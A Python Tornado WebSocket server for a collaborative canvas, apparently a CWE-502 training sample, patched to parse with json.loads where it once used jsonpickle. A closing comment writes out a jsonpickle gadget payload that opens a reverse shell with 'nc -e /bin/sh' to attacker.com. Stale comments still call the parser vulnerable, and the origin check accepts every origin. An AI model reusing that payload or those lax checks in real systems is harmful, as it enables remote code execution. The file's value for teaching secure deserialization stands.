import os
import uuid
import sqlite3
import logging
import asyncio
import jsonpickle
import tornado.ioloop
import tornado.web
import tornado.websocket
from datetime import datetime

# Configure logging for the Collaborative Canvas Server
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - CanvasSync - %(levelname)s - %(message)s'
)
logger = logging.getLogger("CollabServer")

DB_FILE = "canvas_state.db"
connected_clients = set()

def init_canvas_db():
    """Initializes the SQLite database for persisting drawing events."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE drawing_events (
            event_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            user_id TEXT NOT NULL,
            action_type TEXT NOT NULL,
            pos_x INTEGER,
            pos_y INTEGER,
            color TEXT
        )
    ''')
    
    # Pre-populate with some historical strokes
    mock_events = [
        ('evt_1001', 'user_alpha', 'draw', 150, 200, '#FF5733'),
        ('evt_1002', 'user_beta', 'erase', 150, 200, '#FFFFFF')
    ]
    cursor.executemany('''
        INSERT INTO drawing_events (event_id, user_id, action_type, pos_x, pos_y, color)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_events)
    
    conn.commit()
    conn.close()
    logger.info("Canvas event database initialized.")

class CanvasEvent:
    """Represents a single drawing action on the collaborative canvas."""
    def __init__(self, user_id, action_type, pos_x, pos_y, color):
        self.event_id = f"evt_{uuid.uuid4().hex[:8]}"
        self.user_id = user_id
        self.action_type = action_type
        self.pos_x = pos_x
        self.pos_y = pos_y
        self.color = color
        self.timestamp = datetime.now().isoformat()

def persist_event(event: CanvasEvent):
    """Saves a validated canvas event to the database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO drawing_events (event_id, user_id, action_type, pos_x, pos_y, color) VALUES (?, ?, ?, ?, ?, ?)",
            (event.event_id, event.user_id, event.action_type, event.pos_x, event.pos_y, event.color)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to persist canvas event {event.event_id}: {e}")

def process_sync_payload(payload: str, client_ip: str) -> CanvasEvent:
    """
    SECURE: Uses standard json.loads instead of jsonpickle to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    
    logger.info(f"Processing secure incoming canvas sync payload from {client_ip}")
    
    try:
        # Secure: We replace the unsafe jsonpickle module with standard json.
        # json.loads() only parses primitive data structures (dicts, lists, strings, numbers)
        # and strictly prevents arbitrary object instantiation or remote code execution.
        event_dict = json.loads(payload)
        
        # Safely and manually reconstruct the CanvasEvent object from the parsed dictionary
        if isinstance(event_dict, dict) and all(k in event_dict for k in ("user_id", "action_type", "pos_x", "pos_y", "color")):
            event_obj = CanvasEvent(
                user_id=str(event_dict["user_id"]),
                action_type=str(event_dict["action_type"]),
                pos_x=int(event_dict["pos_x"]),
                pos_y=int(event_dict["pos_y"]),
                color=str(event_dict["color"])
            )
            
            # If the client provided an original timestamp or event_id, we can safely apply them
            if "event_id" in event_dict:
                event_obj.event_id = str(event_dict["event_id"])
            if "timestamp" in event_dict:
                event_obj.timestamp = str(event_dict["timestamp"])
                
            logger.debug(f"Valid canvas event received and safely parsed from {event_obj.user_id}")
            return event_obj
        else:
            logger.warning(f"Decoded JSON from {client_ip} is missing required CanvasEvent attributes.")
            return None
            
    except (json.JSONDecodeError, TypeError, ValueError) as e:
        logger.error(f"Failed to parse or validate sync payload from {client_ip}: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error processing sync payload from {client_ip}: {e}")
        return None

class CanvasWebSocketHandler(tornado.websocket.WebSocketHandler):
    """Handles real-time WebSocket connections for the collaborative canvas."""
    
    def check_origin(self, origin):
        # In a real app, origin checking should be strict.
        return True
        
    def open(self):
        self.client_ip = self.request.remote_ip
        connected_clients.add(self)
        logger.info(f"WebSocket client connected from {self.client_ip}. Total clients: {len(connected_clients)}")
        
    def on_message(self, message):
        """Triggered when a client sends a drawing event over the WebSocket."""
        # Pass the untrusted WebSocket message directly to the vulnerable deserialization function
        event = process_sync_payload(message, self.client_ip)
        
        if event:
            persist_event(event)
            # Re-broadcast the valid event to all other connected clients
            broadcast_payload = jsonpickle.encode(event, unpicklable=False)
            for client in connected_clients:
                if client != self:
                    try:
                        client.write_message(broadcast_payload)
                    except tornado.websocket.WebSocketClosedError:
                        pass
                        
    def on_close(self):
        connected_clients.remove(self)
        logger.info(f"WebSocket client disconnected ({self.client_ip}).")

class HealthCheckHandler(tornado.web.RequestHandler):
    """Simple REST endpoint to verify server status."""
    def get(self):
        self.write({"status": "Canvas Sync Server is running", "active_clients": len(connected_clients)})

def make_app():
    """Configures the Tornado web application routing."""
    return tornado.web.Application([
        (r"/api/v1/health", HealthCheckHandler),
        (r"/ws/canvas/sync", CanvasWebSocketHandler),
    ])

if __name__ == "__main__":
    init_canvas_db()
    
    app = make_app()
    app.listen(8888)
    
    logger.info("Starting Tornado Canvas Sync Server on ws://0.0.0.0:8888/ws/canvas/sync")
    
    # Example Malicious Trigger:
    # 1. Attacker connects to the WebSocket: ws = new WebSocket("ws://127.0.0.1:8888/ws/canvas/sync")
    # 2. Attacker crafts a malicious JSON payload using jsonpickle's OS command execution gadget:
    #    payload = '{"py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["nc -e /bin/sh attacker.com 4444"]}]}'
    # 3. Attacker sends the payload: ws.send(payload)
    
    tornado.ioloop.IOLoop.current().start()
